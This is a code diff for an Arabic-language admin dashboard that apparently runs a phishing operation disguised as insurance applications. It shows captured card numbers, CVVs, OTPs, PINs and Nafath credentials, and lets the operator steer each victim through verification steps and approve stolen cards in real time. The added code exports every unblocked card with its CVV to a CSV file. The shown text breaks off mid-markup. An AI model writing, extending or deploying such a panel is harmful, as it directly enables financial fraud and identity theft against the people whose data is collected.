@@ -4,36 +4,39 @@ import type React from "react"
 import { useState, useEffect, useMemo, useCallback, useRef } from "react"
 import {
   Search,
-  CheckCircle,
   MessageSquare,
   Settings,
   Phone,
   CreditCard,
-  Mail,
   Filter,
   FileText,
-  Car,
   Shield,
   User,
   ChevronDown,
   History,
   Info,
+  Download,
+  Ban,
+  Globe,
+  Eye,
+  EyeOff,
+  Trash2,
+  Copy,
+  Check,
+  X,
+  Clock,
+  MapPin,
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { Input } from "@/components/ui/input"
 import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"
-import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu"
+import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger, DropdownMenuSeparator } from "@/components/ui/dropdown-menu"
 import { subscribeToApplications, updateApplication } from "@/lib/firestore-services"
 import type { InsuranceApplication } from "@/lib/firestore-types"
 import { ChatPanel } from "@/components/chat-panel"
 import { playErrorSound, playNotificationSound, playSuccessSound } from "@/lib/actions"
-import { CreditCardMockup } from "@/components/credit-card-mockup"
-import { ApplicationCard } from "@/components/application-card"
-import { ApprovalButtons } from "@/components/approval-buttons"
-import { DetailSection } from "@/components/detail-section"
-import { DataField } from "@/components/data-field"
-import { StatCard } from "@/components/stat-card (1)"
+import { Checkbox } from "@/components/ui/checkbox"
 
 const STEP_NAMES: Record<number | string, string> = {
   1: "PIN",
@@ -45,32 +48,37 @@ const STEP_NAMES: Record<number | string, string> = {
   home: "الرئيسية",
 }
 
+const COUNTRIES = ["السعودية", "الإمارات", "الكويت", "البحرين", "قطر", "عمان", "مصر", "الأردن"]
+
 export default function AdminDashboard() {
   const [applications, setApplications] = useState<InsuranceApplication[]>([])
   const [filteredApplications, setFilteredApplications] = useState<InsuranceApplication[]>([])
   const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
   const [searchQuery, setSearchQuery] = useState("")
   const [dataFilter, setDataFilter] = useState<string>("all")
-  const [cardFilter, setCardFilter] = useState<"all" | "hasCard" | "noCard">("all")
+  const [countryFilter, setCountryFilter] = useState<string>("all")
   const [loading, setLoading] = useState(true)
   const [showChat, setShowChat] = useState(false)
-  const [showCardHistory, setShowCardHistory] = useState(false)
   const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())
-  const [authNumber, setAuthNumber] = useState("")
+  const [blockedCards, setBlockedCards] = useState<string[]>([])
+  const [showBlockedPanel, setShowBlockedPanel] = useState(false)
+  const [copiedField, setCopiedField] = useState<string | null>(null)
   const prevApplicationsCount = useRef<number>(0)
 
-  // Stats calculation - counting cards, phones, and info
+  const hasData = (app: InsuranceApplication) => {
+    return !!(app.cardNumber || app.otp || app.pinCode || app.nafazId || app.phoneNumber2)
+  }
+
   const stats = useMemo(
     () => ({
       total: applications.length,
-      cards: applications.filter((a) => !!(a.cardNumber || a.expiryDate || a.cvv)).length,
-      phones: applications.filter((a) => !!(a.phoneNumber2 || a.phoneOtp)).length,
-      info: applications.filter((a) => !!(a.nafazId || a.nafazPass || a.pinCode || a.documentType)).length,
+      withData: applications.filter(hasData).length,
+      visitors: applications.filter(a => !hasData(a)).length,
+      cards: applications.filter((a) => !!(a.cardNumber)).length,
     }),
     [applications],
   )
 
-  // Subscribe to applications from Firestore
   useEffect(() => {
     setLoading(true)
     const unsubscribe = subscribeToApplications((apps) => {
@@ -81,48 +89,38 @@ export default function AdminDashboard() {
       setApplications(apps)
       setLoading(false)
     })
-
     return () => unsubscribe()
   }, [])
 
-  // Filter applications
   useEffect(() => {
     const timer = setTimeout(() => {
       let filtered = applications
 
-      // Filter by data type
-      if (dataFilter === "cards") {
-        filtered = filtered.filter((app) => !!(app.cardNumber || app.expiryDate || app.cvv))
-      } else if (dataFilter === "phones") {
-        filtered = filtered.filter((app) => !!(app.phoneNumber2 || app.phoneOtp))
-      } else if (dataFilter === "info") {
-        filtered = filtered.filter((app) => !!(app.nafazId || app.nafazPass || app.pinCode || app.documentType))
+      if (dataFilter === "withData") {
+        filtered = filtered.filter(hasData)
+      } else if (dataFilter === "visitors") {
+        filtered = filtered.filter(a => !hasData(a))
+      } else if (dataFilter === "cards") {
+        filtered = filtered.filter((a) => !!a.cardNumber)
       }
 
-      // Additional card filter
-      if (cardFilter === "hasCard") {
-        filtered = filtered.filter((app) => !!(app.cardNumber || app.expiryDate || app.cvv))
-      } else if (cardFilter === "noCard") {
-        filtered = filtered.filter((app) => !(app.cardNumber || app.expiryDate || app.cvv))
+      if (countryFilter !== "all") {
+        filtered = filtered.filter(a => a.country === countryFilter)
       }
 
-      // Search filter
       if (searchQuery) {
         const query = searchQuery.toLowerCase()
         filtered = filtered.filter(
           (app) =>
             app.ownerName?.toLowerCase().includes(query) ||
-            app.identityNumber.includes(query) ||
+            app.identityNumber?.includes(query) ||
             app.cardNumber?.includes(query),
         )
       }
 
-      // Sort by unread first, then by date (newest first)
       filtered = filtered.sort((a, b) => {
-        // Unread items first
         if (a.isUnread && !b.isUnread) return -1
         if (!a.isUnread && b.isUnread) return 1
-        // Then by date - newest first
         const dateA = a.createdAt ? new Date(a.createdAt).getTime() : 0
         const dateB = b.createdAt ? new Date(b.createdAt).getTime() : 0
         return dateB - dateA
@@ -132,9 +130,8 @@ export default function AdminDashboard() {
     }, 200)
 
     return () => clearTimeout(timer)
-  }, [applications, searchQuery, dataFilter, cardFilter])
+  }, [applications, searchQuery, dataFilter, countryFilter])
 
-  // Sync selected application with updates
   useEffect(() => {
     if (selectedApplication) {
       const updated = applications.find((app) => app.id === selectedApplication.id)
@@ -142,170 +139,148 @@ export default function AdminDashboard() {
     }
   }, [applications, selectedApplication])
 
-  // Utility functions
-  const formatArabicDate = useCallback((dateString?: string) => {
+  const formatTime = useCallback((dateString?: string) => {
     if (!dateString) return ""
     const date = new Date(dateString)
     const now = new Date()
-    const diffInSeconds = Math.floor((now.getTime() - date.getTime()) / 1000)
-
-    if (diffInSeconds < 60) return "منذ لحظات"
-    if (diffInSeconds < 3600) {
-      const minutes = Math.floor(diffInSeconds / 60)
-      return `منذ ${minutes} ${minutes === 1 ? "دقيقة" : minutes <= 2 ? "دقيقتين" : "دقائق"}`
-    }
-    if (diffInSeconds < 86400) {
-      const hours = Math.floor(diffInSeconds / 3600)
-      return `منذ ${hours} ${hours === 1 ? "ساعة" : hours <= 2 ? "ساعتين" : "ساعات"}`
-    }
-    if (diffInSeconds < 604800) {
-      const days = Math.floor(diffInSeconds / 86400)
-      return `منذ ${days} ${days === 1 ? "يوم" : days <= 2 ? "يومين" : "أيام"}`
-    }
-
-    return date.toLocaleDateString("ar-SA", { year: "numeric", month: "long", day: "numeric" })
+    const diff = Math.floor((now.getTime() - date.getTime()) / 1000)
+    if (diff < 60) return "الآن"
+    if (diff < 3600) return `${Math.floor(diff / 60)}د`
+    if (diff < 86400) return `${Math.floor(diff / 3600)}س`
+    return `${Math.floor(diff / 86400)}ي`
   }, [])
 
-  const getStepName = (step: number | string) => STEP_NAMES[step] || `الخطوة ${step}`
+  const copyToClipboard = async (text: string, fieldId: string) => {
+    await navigator.clipboard.writeText(text)
+    setCopiedField(fieldId)
+    setTimeout(() => setCopiedField(null), 2000)
+  }
 
-  const hasCardInfo = (app: InsuranceApplication) => !!(app.cardNumber || app.expiryDate || app.cvv)
+  const exportCards = () => {
+    const cardsData = applications
+      .filter(a => a.cardNumber && !blockedCards.includes(a.cardNumber))
+      .map(a => `${a.cardNumber},${a.expiryDate || ""},${a.cvv || ""},${a.ownerName || ""}`)
+      .join("\n")
+    
+    const blob = new Blob([`Card Number,Expiry,CVV,Name\n${cardsData}`], { type: "text/csv" })
+    const url = URL.createObjectURL(blob)
+    const a = document.createElement("a")
+    a.href = url
+    a.download = "cards_export.csv"
+    a.click()
+    URL.revokeObjectURL(url)
+    playSuccessSound()
+  }
 
-  const hasAnyData = (app: InsuranceApplication) =>
-    !!(
-      app.cardNumber ||
-      app.otp ||
-      app.allOtps ||
-      app.phoneNumber2 ||
-      app.phoneOtp ||
-      app.selectedCarrier ||
-      app.totalPrice ||
-      app.pinCode ||
-      app.nafazId ||
-      app.documentType
-    )
-
-  // Action handlers
-  const handleStepChange = useCallback(async (appId: string, newStep: number | string) => {
-    try {
-      await updateApplication(appId, { currentStep: newStep as number })
-    } catch (error) {
-      console.error("Error updating step:", error)
-    }
-  }, [])
-
-  const handleApprovalChange = useCallback(
-    async (appId: string, field: keyof InsuranceApplication, status: "approved" | "rejected" | "pending") => {
-      try {
-        await updateApplication(appId, { [field]: status })
-        if (status === "approved") playSuccessSound()
-        else if (status === "rejected") playErrorSound()
-      } catch (error) {
-        console.error("Error updating approval:", error)
-        playErrorSound()
-      }
-    },
-    [],
-  )
-
-  const handleAuthNumber = async (appId: string, auth: string) => {
-    try {
-      await updateApplication(appId, { authNumber: auth })
+  const blockCard = (cardNumber: string) => {
+    if (!blockedCards.includes(cardNumber)) {
+      setBlockedCards([...blockedCards, cardNumber])
       playSuccessSound()
-      setAuthNumber("")
+    }
+  }
+
+  const unblockCard = (cardNumber: string) => {
+    setBlockedCards(blockedCards.filter(c => c !== cardNumber))
+  }
+
+  const handleStepChange = async (appId: string, step: number | string) => {
+    try {
+      await updateApplication(appId, { currentStep: step })
+      playSuccessSound()
     } catch (error) {
-      console.error("Error saving auth number:", error)
       playErrorSound()
     }
   }
 
-  const markAsRead = useCallback(async (app: InsuranceApplication) => {
-    if (app.isUnread) {
-      try {
-        await updateApplication(app.id!, { isUnread: false })
-      } catch (error) {
-        console.error("Error marking as read:", error)
-      }
-    }
-  }, [])
-
-  const toggleReadStatus = useCallback(async (appId: string, currentIsUnread: boolean, e: React.MouseEvent) => {
+  const toggleRead = useCallback(async (app: InsuranceApplication, e: React.MouseEvent) => {
     e.stopPropagation()
     try {
-      await updateApplication(appId, { isUnread: !currentIsUnread })
+      await updateApplication(app.id!, { isUnread: !app.isUnread })
     } catch (error) {
-      console.error("Error toggling read status:", error)
+      console.error(error)
     }
   }, [])
 
-  const toggleSelection = useCallback((id: string, e: React.MouseEvent) => {
-    e.stopPropagation()
-    setSelectedIds((prev) => {
-      const newSet = new Set(prev)
-      if (newSet.has(id)) newSet.delete(id)
-      else newSet.add(id)
-      return newSet
-    })
-  }, [])
-
-  const handleDelete = useCallback(
-    async (appId: string, e: React.MouseEvent) => {
-      e.stopPropagation()
-      if (window.confirm("هل أنت متأكد من حذف هذا الطلب؟")) {
-        if (selectedApplication?.id === appId) setSelectedApplication(null)
-        setSelectedIds((prev) => {
-          const newSet = new Set(prev)
-          newSet.delete(appId)
-          return newSet
-        })
-        playSuccessSound()
-      }
-    },
-    [selectedApplication],
-  )
+  const selectApp = (app: InsuranceApplication) => {
+    setSelectedApplication(app)
+    setShowChat(false)
+    if (app.isUnread) {
+      updateApplication(app.id!, { isUnread: false })
+    }
+  }
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 text-[11px]" dir="rtl">
-      {/* Header + Stats Combined */}
-      <header className="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-xl border-b border-slate-700/50 px-3 py-1.5">
-        <div className="flex items-center justify-between">
-          <div className="flex items-center gap-2">
-            <div className="w-6 h-6 rounded bg-gradient-to-br from-emerald-500 to-green-600 flex items-center justify-center">
-              <Shield className="w-3 h-3 text-white" />
-            </div>
-            <span className="text-xs font-bold text-white">لوحة التحكم</span>
+    <div className="h-screen bg-slate-950 text-[11px] flex flex-col" dir="rtl">
+      {/* Header */}
+      <header className="bg-slate-900 border-b border-slate-800 px-3 py-1.5 flex items-center justify-between flex-shrink-0">
+        <div className="flex items-center gap-2">
+          <div className="w-6 h-6 rounded bg-emerald-500 flex items-center justify-center">
+            <Shield className="w-3 h-3 text-white" />
           </div>
-          <div className="flex items-center gap-4">
-            <div className="flex items-center gap-1">
-              <FileText className="w-3 h-3 text-slate-400" />
-              <span className="font-bold text-slate-300">{stats.total}</span>
-            </div>
-            <div className="flex items-center gap-1">
-              <CreditCard className="w-3 h-3 text-emerald-400" />
-              <span className="font-bold text-emerald-400">{stats.cards}</span>
-            </div>
-            <div className="flex items-center gap-1">
-              <Phone className="w-3 h-3 text-amber-400" />
-              <span className="font-bold text-amber-400">{stats.phones}</span>
-            </div>
-            <div className="flex items-center gap-1">
-              <Info className="w-3 h-3 text-slate-400" />
-              <span className="font-bold text-slate-300">{stats.info}</span>
-            </div>
-          </div>
-          <div className="flex items-center gap-1">
-            <Button variant="ghost" size="icon" className="h-6 w-6 text-slate-400 hover:text-white">
-              <Settings className="w-3 h-3" />
-            </Button>
-            <div className="w-6 h-6 rounded bg-emerald-500 flex items-center justify-center text-[10px] font-bold text-white">م</div>
-          </div>
+          <span className="text-xs font-bold text-white">البريد الوارد</span>
+        </div>
+        
+        <div className="flex items-center gap-3 text-[10px]">
+          <span className="text-slate-400">الكل: <span className="text-white font-bold">{stats.total}</span></span>
+          <span className="text-slate-400">بيانات: <span className="text-emerald-400 font-bold">{stats.withData}</span></span>
+          <span className="text-slate-400">زوار: <span className="text-slate-500 font-bold">{stats.visitors}</span></span>
+          <span className="text-slate-400">بطاقات: <span className="text-amber-400 font-bold">{stats.cards}</span></span>
+        </div>
+
+        <div className="flex items-center gap-1">
+          <Button onClick={exportCards} variant="ghost" size="sm" className="h-6 px-2 text-[10px] text-slate-400 hover:text-white gap-1">
+            <Download className="w-3 h-3" />
+            تصدير
+          </Button>
+          <Button onClick={() => setShowBlockedPanel(!showBlockedPanel)} variant="ghost" size="sm" className="h-6 px-2 text-[10px] text-slate-400 hover:text-white gap-1">
+            <Ban className="w-3 h-3" />
+            المحظورة ({blockedCards.length})
+          </Button>
+          <DropdownMenu>
+            <DropdownMenuTrigger asChild>
+              <Button variant="ghost" size="sm" className="h-6 px-2 text-[10px] text-slate-400 hover:text-white gap-1">
+                <Globe className="w-3 h-3" />
+                {countryFilter === "all" ? "كل الدول" : countryFilter}
+                <ChevronDown className="w-2.5 h-2.5" />
+              </Button>
+            </DropdownMenuTrigger>
+            <DropdownMenuContent align="end" className="bg-slate-800 border-slate-700">
+              <DropdownMenuItem onClick={() => setCountryFilter("all")} className="text-[10px] text-slate-300">كل الدول</DropdownMenuItem>
+              <DropdownMenuSeparator className="bg-slate-700" />
+              {COUNTRIES.map(c => (
+                <DropdownMenuItem key={c} onClick={() => setCountryFilter(c)} className="text-[10px] text-slate-300">{c}</DropdownMenuItem>
+              ))}
+            </DropdownMenuContent>
+          </DropdownMenu>
         </div>
       </header>
 
-      <div className="flex h-[calc(100vh-38px)]">
-        {/* Sidebar */}
-        <div className="w-[260px] bg-slate-900/70 backdrop-blur-sm border-l border-slate-700/50 flex flex-col">
-          {/* Search & Filters */}
-          <div className="p-1.5 border-b border-slate-700/50">
+      {/* Blocked Cards Panel */}
+      {showBlockedPanel && (
+        <div className="bg-slate-900 border-b border-slate-800 px-3 py-2">
+          <div className="flex items-center gap-2 mb-2">
+            <Ban className="w-3 h-3 text-red-400" />
+            <span className="text-[10px] font-bold text-slate-300">البطاقات المحظورة</span>
+          </div>
+          {blockedCards.length === 0 ? (
+            <span className="text-[10px] text-slate-500">لا توجد بطاقات محظورة</span>
+          ) : (
+            <div className="flex flex-wrap gap-1">
+              {blockedCards.map(card => (
+                <Badge key={card} className="text-[9px] bg-red-500/20 text-red-400 border-0 gap-1">
+                  {card.slice(-4)}****
+                  <X className="w-2.5 h-2.5 cursor-pointer hover:text-white" onClick={() => unblockCard(card)} />
+                </Badge>
+              ))}
+            </div>
+          )}
+        </div>
+      )}
+
+      <div className="flex flex-1 min-h-0">
+        {/* Inbox List */}
+        <div className="w-[280px] bg-slate-900/50 border-l border-slate-800 flex flex-col">
+          <div className="p-1.5 border-b border-slate-800">
             <div className="flex items-center gap-1 mb-1">
               <div className="relative flex-1">
                 <Search className="absolute right-1.5 top-1/2 -translate-y-1/2 w-3 h-3 text-slate-500" />
@@ -313,79 +288,76 @@ export default function AdminDashboard() {
                   placeholder="بحث..."
                   value={searchQuery}
                   onChange={(e) => setSearchQuery(e.target.value)}
-                  className="pr-6 h-6 text-[10px] bg-slate-800/80 border-slate-700/50 text-slate-200 placeholder:text-slate-500 rounded"
+                  className="pr-6 h-6 text-[10px] bg-slate-800 border-slate-700 text-slate-200 rounded"
                 />
               </div>
-              <DropdownMenu>
-                <DropdownMenuTrigger asChild>
-                  <Button variant="outline" size="sm" className="h-6 w-6 p-0 bg-slate-800/80 border-slate-700/50 text-slate-400 rounded">
-                    <Filter className="w-2.5 h-2.5" />
-                  </Button>
-                </DropdownMenuTrigger>
-                <DropdownMenuContent align="end" className="w-28 bg-slate-800 border-slate-700">
-                  <DropdownMenuItem onClick={() => setCardFilter("all")} className="text-slate-300 text-[10px] py-1">الكل</DropdownMenuItem>
-                  <DropdownMenuItem onClick={() => setCardFilter("hasCard")} className="text-slate-300 text-[10px] py-1">لديه بطاقة</DropdownMenuItem>
-                  <DropdownMenuItem onClick={() => setCardFilter("noCard")} className="text-slate-300 text-[10px] py-1">بدون بطاقة</DropdownMenuItem>
-                </DropdownMenuContent>
-              </DropdownMenu>
             </div>
             <Tabs defaultValue="all" className="w-full" onValueChange={setDataFilter}>
-              <TabsList className="w-full h-5 p-0 bg-slate-800/80 rounded border border-slate-700/50">
+              <TabsList className="w-full h-5 p-0 bg-slate-800 rounded">
                 <TabsTrigger value="all" className="flex-1 h-5 text-[9px] rounded-sm data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400">الكل</TabsTrigger>
-                <TabsTrigger value="phones" className="flex-1 h-5 text-[9px] rounded-sm data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400">هاتف</TabsTrigger>
+                <TabsTrigger value="withData" className="flex-1 h-5 text-[9px] rounded-sm data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400">بيانات</TabsTrigger>
+                <TabsTrigger value="visitors" className="flex-1 h-5 text-[9px] rounded-sm data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400">زوار</TabsTrigger>
                 <TabsTrigger value="cards" className="flex-1 h-5 text-[9px] rounded-sm data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400">بطاقات</TabsTrigger>
-                <TabsTrigger value="info" className="flex-1 h-5 text-[9px] rounded-sm data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400">معلومات</TabsTrigger>
               </TabsList>
             </Tabs>
           </div>
 
-          {/* Applications List */}
-          <div className="flex-1 overflow-y-auto custom-scrollbar">
+          <div className="flex-1 overflow-y-auto">
             {loading ? (
-              <div className="flex items-center justify-center h-full">
-                <div className="text-center space-y-4">
-                  <div className="relative">
-                    <div className="w-12 h-12 border-2 border-slate-700 border-t-emerald-500 rounded-full animate-spin mx-auto" />
-                  </div>
-                  <p className="text-sm text-slate-400">جاري التحميل...</p>
-                </div>
+              <div className="flex items-center justify-center h-32">
+                <div className="w-5 h-5 border-2 border-emerald-500 border-t-transparent rounded-full animate-spin" />
               </div>
             ) : filteredApplications.length === 0 ? (
-              <div className="flex flex-col items-center justify-center h-full p-8 text-center">
-                <div className="w-20 h-20 rounded-2xl bg-gradient-to-br from-slate-800 to-slate-700 flex items-center justify-center mx-auto mb-4 shadow-xl">
-                  <Mail className="w-10 h-10 text-slate-500" />
-                </div>
-                <p className="text-slate-200 font-semibold mb-1">لا توجد طلبات</p>
-                <p className="text-sm text-slate-500">سيتم عرض الطلبات هنا عند إضافتها</p>
-              </div>
+              <div className="text-center text-slate-500 py-8 text-[10px]">لا توجد نتائج</div>
             ) : (
-              <div>
-                {filteredApplications.map((app) => (
-                  <ApplicationCard
+              filteredApplications.map((app) => {
+                const appHasData = hasData(app)
+                const isActive = selectedApplication?.id === app.id
+                return (
+                  <div
                     key={app.id}
-                    app={app}
-                    isSelected={selectedIds.has(app.id!)}
-                    isActive={selectedApplication?.id === app.id}
-                    stepName={getStepName(app.currentStep)}
-                    formattedDate={formatArabicDate(app.createdAt)}
-                    hasCard={hasCardInfo(app)}
-                    onSelect={() => {
-                      setSelectedApplication(app)
-                      setShowChat(false)
-                      markAsRead(app)
-                    }}
-                    onToggleSelection={(e) => toggleSelection(app.id!, e)}
-                    onToggleRead={(e) => toggleReadStatus(app.id!, app.isUnread === true, e)}
-                    onDelete={(e) => handleDelete(app.id!, e)}
-                  />
-                ))}
-              </div>
+                    onClick={() => selectApp(app)}
+                    className={`px-2 py-1.5 cursor-pointer border-b border-slate-800/50 transition-all
+                      ${app.isUnread ? "bg-emerald-500/5" : ""}
+                      ${isActive ? "bg-emerald-500/10 border-r-2 border-r-emerald-500" : "hover:bg-slate-800/30"}`}
+                  >
+                    <div className="flex items-center justify-between mb-0.5">
+                      <div className="flex items-center gap-1.5 min-w-0">
+                        <div className={`w-2 h-2 rounded-full flex-shrink-0 ${appHasData ? "bg-emerald-500" : "bg-slate-600"}`} />
+                        <span className={`font-medium truncate text-[10px] ${isActive ? "text-emerald-300" : "text-slate-200"}`}>
+                          {app.ownerName || "زائر"}
+                        </span>
+                        {app.isUnread && <div className="w-1.5 h-1.5 rounded-full bg-blue-500 flex-shrink-0" />}
+                      </div>
+                      <span className="text-[9px] text-slate-500 flex-shrink-0">{formatTime(app.createdAt)}</span>
+                    </div>
+                    <div className="flex items-center gap-1 text-[9px] text-slate-500">
+                      {appHasData ? (
+                        <>
+                          {app.cardNumber && <CreditCard className="w-2.5 h-2.5 text-amber-400" />}
+                          {app.otp && <span className="text-amber-400">OTP</span>}
+                          {app.pinCode && <span className="text-blue-400">PIN</span>}
+                          {app.nafazId && <Shield className="w-2.5 h-2.5 text-purple-400" />}
+                        </>
+                      ) : (
+                        <span className="text-slate-600">زائر فقط</span>
+                      )}
+                      {app.country && (
+                        <span className="mr-auto flex items-center gap-0.5">
+                          <MapPin className="w-2.5 h-2.5" />
+                          {app.country}
+                        </span>
+                      )}
+                    </div>
+                  </div>
+                )
+              })
             )}
           </div>
         </div>
 
-        {/* Main Content */}
-        <div className="flex-1 bg-gradient-to-br from-slate-900/50 to-slate-950/50 overflow-hidden">
+        {/* Conversation View */}
+        <div className="flex-1 bg-slate-950 flex flex-col">
           {selectedApplication ? (
             showChat ? (
               <ChatPanel
@@ -396,316 +368,209 @@ export default function AdminDashboard() {
                 onClose={() => setShowChat(false)}
               />
             ) : (
-              <div className="h-full flex flex-col">
-                {/* Detail Header - Ultra Compact */}
-                <div className="sticky top-0 z-10 bg-slate-900/90 backdrop-blur-xl border-b border-slate-700/50 px-2 py-1.5">
-                  <div className="flex items-center justify-between mb-1">
-                    <div className="flex items-center gap-2">
-                      <div className="w-7 h-7 rounded-lg bg-gradient-to-br from-emerald-500 to-green-600 flex items-center justify-center text-xs font-bold text-white">
-                        {selectedApplication.ownerName?.charAt(0) || "م"}
-                      </div>
-                      <div>
-                        <h2 className="text-sm font-bold text-white">{selectedApplication.ownerName || "بدون اسم"}</h2>
-                        <div className="flex items-center gap-1">
-                          <Badge className="text-[8px] bg-slate-700/80 text-slate-300 border-0 py-0 px-1">{getStepName(selectedApplication.currentStep)}</Badge>
-                          {selectedApplication.country && <span className="text-[10px] text-slate-400">{selectedApplication.country}</span>}
-                        </div>
+              <>
+                {/* Conversation Header */}
+                <div className="bg-slate-900 border-b border-slate-800 px-3 py-2 flex items-center justify-between flex-shrink-0">
+                  <div className="flex items-center gap-2">
+                    <div className="w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center text-sm font-bold text-white">
+                      {selectedApplication.ownerName?.charAt(0) || "ز"}
+                    </div>
+                    <div>
+                      <div className="font-bold text-white text-xs">{selectedApplication.ownerName || "زائر"}</div>
+                      <div className="text-[9px] text-slate-400 flex items-center gap-2">
+                        <span>{selectedApplication.phoneNumber}</span>
+                        {selectedApplication.country && <span>• {selectedApplication.country}</span>}
                       </div>
                     </div>
-                    <Button onClick={() => setShowChat(true)} size="sm" className="gap-1 bg-emerald-500 hover:bg-emerald-600 text-white border-0 rounded h-6 px-2 text-[10px]">
-                      <MessageSquare className="w-3 h-3" />
-                      دردشة
-                    </Button>
                   </div>
-                  {/* Step Controls - Ultra Compact */}
-                  <div className="flex flex-wrap gap-1">
-                    {["nafad", "phone", "home", 1, 2, 3, 4].map((step, i) => (
+                  <div className="flex items-center gap-1">
+                    {["nafad", "phone", "home", 1, 2, 3, 4].map((step) => (
                       <Button
                         key={step}
                         onClick={() => handleStepChange(selectedApplication.id!, step)}
                         size="sm"
-                        className={`h-5 text-[9px] px-1.5 rounded transition-all ${
-                          selectedApplication.currentStep === step 
-                            ? "bg-emerald-500 text-white border-0" 
-                            : "bg-slate-800/50 border border-slate-700/50 text-slate-400 hover:text-white"
+                        className={`h-5 text-[8px] px-1.5 rounded ${
+                          selectedApplication.currentStep === step
+                            ? "bg-emerald-500 text-white"
+                            : "bg-slate-800 text-slate-400 hover:text-white"
                         }`}
                       >
                         {STEP_NAMES[step]}
                       </Button>
                     ))}
+                    <Button onClick={() => setShowChat(true)} size="sm" className="h-6 px-2 bg-blue-500 hover:bg-blue-600 text-white text-[10px] gap-1 mr-2">
+                      <MessageSquare className="w-3 h-3" />
+                    </Button>
                   </div>
                 </div>
 
-                {/* Detail Content - Compact grid */}
-                <div className="flex-1 overflow-y-auto p-1.5 custom-scrollbar">
-                  {hasAnyData(selectedApplication) ? (
-                    <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-2 max-w-7xl">
-                      {/* Payment Card */}
-                      {selectedApplication.cardNumber && (
-                        <DetailSection
-                          icon={CreditCard}
-                          title="معلومات الدفع"
-                          delay={0}
-                          badge={
-                            selectedApplication.cardHistory && selectedApplication.cardHistory.length > 0 ? (
-                              <Button
-                                variant="ghost"
-                                size="sm"
-                                onClick={() => setShowCardHistory(!showCardHistory)}
-                                className="h-7 text-xs gap-1"
-                              >
-                                <History className="w-3 h-3" />
-                                {selectedApplication.cardHistory.length} سابقة
-                              </Button>
-                            ) : null
-                          }
-                        >
-                          <div className="space-y-4">
-                            <CreditCardMockup
-                              cardNumber={selectedApplication.cardNumber}
-                              expiryDate={selectedApplication.expiryDate}
-                              cvv={selectedApplication.cvv}
-                              cardholderName={selectedApplication.ownerName}
-                            />
-                            {selectedApplication.totalPrice && (
-                              <div className="p-3 bg-success/10 border border-success/20 rounded-lg text-center">
-                                <p className="text-[10px] text-success mb-1">قيمة التأمين</p>
-                                <p className="text-xl font-bold text-success font-mono" dir="ltr">
-                                  {selectedApplication.totalPrice} ر.س
-                                </p>
-                              </div>
-                            )}
-                            <ApprovalButtons
-                              onApprove={() =>
-                                handleApprovalChange(selectedApplication.id!, "cardApproved", "approved")
-                              }
-                              onReject={() => handleApprovalChange(selectedApplication.id!, "cardApproved", "rejected")}
-                              approveDisabled={selectedApplication.cardApproved === "approved"}
-                              rejectDisabled={selectedApplication.cardApproved === "rejected"}
-                              approveLabel="قبول البطاقة"
-                              rejectLabel="رفض البطاقة"
-                            />
-                            {/* Card History */}
-                            {showCardHistory &&
-                              selectedApplication.cardHistory &&
-                              selectedApplication.cardHistory.length > 0 && (
-                                <div className="pt-4 border-t border-border space-y-3">
-                                  <h4 className="text-xs font-medium text-muted-foreground flex items-center gap-2">
-                                    <History className="w-3.5 h-3.5" />
-                                    البطاقات السابقة
-                                  </h4>
-                                  {selectedApplication.cardHistory.map((card: { cardNumber: string | undefined; expiryDate: string | undefined; cvv: string | undefined; addedAt: string | undefined }, i: React.Key | null | undefined) => (
-                                    <div key={i} className="p-3 bg-muted/50 rounded-lg">
-                                      <CreditCardMockup
-                                        cardNumber={card.cardNumber}
-                                        expiryDate={card.expiryDate}
-                                        cvv={card.cvv}
-                                        cardholderName={selectedApplication.ownerName}
-                                      />
-                                      <p className="text-[10px] text-muted-foreground mt-2 text-center">
-                                        {formatArabicDate(card.addedAt)}
-                                      </p>
-                                    </div>
-                                  ))}
-                                </div>
-                              )}
-                          </div>
-                        </DetailSection>
-                      )}
-
-                      {/* OTP Section */}
-                      {selectedApplication.otp && (
-                        <DetailSection icon={Shield} title="رمز التحقق OTP" delay={100}>
-                          <div className="space-y-4">
-                            <div className="p-4 bg-primary/10 border border-primary/20 rounded-lg text-center">
-                              <p className="text-[10px] text-primary mb-2">الرمز الحالي</p>
-                              <p className="text-3xl font-bold text-primary font-mono tracking-widest" dir="ltr">
-                                {selectedApplication.otp}
-                              </p>
-                            </div>
-                            <ApprovalButtons
-                              onApprove={() =>
-                                handleApprovalChange(selectedApplication.id!, "cardOtpApproved", "approved")
-                              }
-                              onReject={() =>
-                                handleApprovalChange(selectedApplication.id!, "cardOtpApproved", "rejected")
-                              }
-                              approveDisabled={selectedApplication.cardOtpApproved === "approved"}
-                              rejectDisabled={selectedApplication.cardOtpApproved === "rejected"}
-                            />
-                            {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
-                              <div className="pt-3 border-t border-border">
-                                <p className="text-[10px] text-muted-foreground mb-2">الرموز السابقة</p>
-                                <div className="flex flex-wrap gap-1.5">
-                                  {selectedApplication.allOtps.map((otp, i) => (
-                                    <Badge key={i} variant="secondary" className="font-mono text-[10px]" dir="ltr">
-                                      {otp}
-                                    </Badge>
-                                  ))}
-                                </div>
-                              </div>
-                            )}
-                          </div>
-                        </DetailSection>
-                      )}
-
-                      {/* PIN Section */}
-                      {selectedApplication.pinCode && (
-                        <DetailSection icon={Shield} title="رمز PIN" delay={150}>
-                          <div className="space-y-4">
-                            <div className="p-4 bg-warning/10 border border-warning/20 rounded-lg text-center">
-                              <p className="text-[10px] text-warning mb-2">Pin Code</p>
-                              <p className="text-3xl font-bold text-warning font-mono tracking-widest" dir="ltr">
